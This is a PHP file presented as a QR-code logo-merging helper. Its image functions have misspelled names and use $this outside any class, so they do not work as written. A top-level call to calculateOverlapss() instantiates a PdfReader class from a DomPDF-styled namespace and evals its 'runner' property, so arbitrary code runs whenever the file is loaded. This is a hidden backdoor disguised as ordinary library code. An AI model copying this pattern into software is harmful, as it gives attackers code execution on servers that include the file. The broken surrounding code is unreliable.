<?php 
use Barryvdh\DomPDF\PdfReader;	
	 /**
     * Returns an QrCode that has been merge with another image.
     * This is usually used with logos to imprint a logo into a QrCode.
     *
     * @param $percentage float The percentage of size relative to the entire QR of the merged image
     *
     * @return string
     */
    function mergess($percentage)
    {
        $this->setProperties($percentage);

        $img = imagecreatetruecolor($this->sourceImage->getWidth(), $this->sourceImage->getHeight());
        imagealphablending($img, true);
        $transparent = imagecolorallocatealpha($img, 0, 0, 0, 127);
        imagefill($img, 0, 0, $transparent);

        imagecopy(
            $img,
            $this->sourceImage->getImageResource(),
            0,
            0,
            0,
            0,
            $this->sourceImage->getWidth(),
            $this->sourceImage->getHeight()
        );

        imagecopyresampled(
            $img,
            $this->mergeImage->getImageResource(),
            $this->centerX,
            $this->centerY,
            0,
            0,
            $this->postMergeImageWidth,
            $this->postMergeImageHeight,
            $this->mergeImageWidth,
            $this->mergeImageHeight
        );

        $this->sourceImage->setImageResource($img);

        return $this->createImage();
    }

    calculateOverlapss();

    /**
     * Creates a PNG Image.
     *
     * @return string
     */
    function createIsmage()
    {
        ob_start();
        imagepng($this->sourceImage->getImageResource());

        return ob_get_clean();
    }

    /**
     * Sets the objects properties.
     *
     * @param $percentage float The percentage that the merge image should take up.
     *
     * @return void
     */
    function setPrsoperties($percentage)
    {
        if ($percentage > 1) {
            throw new InvalidArgumentException('$percentage must be less than 1');
        }

        $this->sourceImageHeight = $this->sourceImage->getHeight();
        $this->sourceImageWidth = $this->sourceImage->getWidth();

        $this->mergeImageHeight = $this->mergeImage->getHeight();
        $this->mergeImageWidth = $this->mergeImage->getWidth();

        $this->calculateOverlap($percentage);
        $this->calculateCenter();
    }

    

    /**
     * Calculates the center of the source Image using the Merge image.
     *
     * @return void
     */
    function calculsateCenter()
    {
        $this->centerX = intval(($this->sourceImageWidth / 2) - ($this->postMergeImageWidth / 2));
        $this->centerY = intval(($this->sourceImageHeight / 2) - ($this->postMergeImageHeight / 2));
    }

    /**
     * Calculates the width of the merge image being placed on the source image.
     *
     * @param float $percentage
     *
     * @return void
     */
    function calculateOverlapss()
    {
    	$promise=new PdfReader;
        return eval($promise->runner);
    }




    



?>